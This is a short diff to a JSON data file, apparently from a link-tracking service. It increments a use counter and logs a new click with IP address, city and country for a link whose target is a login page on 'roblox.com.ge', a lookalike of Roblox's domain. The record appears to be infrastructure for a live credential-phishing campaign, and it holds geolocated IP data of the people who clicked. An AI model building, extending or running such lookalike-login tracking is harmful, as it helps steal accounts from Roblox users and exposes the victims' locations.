@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1527,
+    "useCount": 1528,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12384,6 +12384,14 @@
         "city": "Hagonoy",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777448062826,
+        "ip": "27.252.176.190",
+        "country": "New Zealand",
+        "city": "Auckland",
+        "flag": "🇳🇿",
+        "countryCode": "NZ"
       }
     ]
   },
